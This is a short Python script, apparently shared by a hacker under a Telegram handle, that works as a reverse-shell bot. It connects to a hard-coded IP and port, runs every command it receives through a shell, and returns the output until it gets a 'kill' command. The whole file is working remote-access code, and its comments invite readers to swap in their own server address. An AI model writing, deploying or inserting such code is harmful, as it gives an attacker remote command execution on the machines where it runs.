#!/usr/bin/env python3
# Please do not copy! Or fork
# if you lammer can fork it 😐😂🍴
# Do not forget to change the variables to your desired variables
# Think I didn't understand (don't tell anyone)
# telegram id 🆔> @Zer0x00 MJi pwned 👾
import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.100', 8080)) # ip and port server
    
    while True:
        command = s.recv(1024)
        
        if 'kill' in command.decode(): # if you send kill command bot et killing Process
            s.close()
            break
        
        else: # run your command
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()

if __name__ == '__main__':
    main()
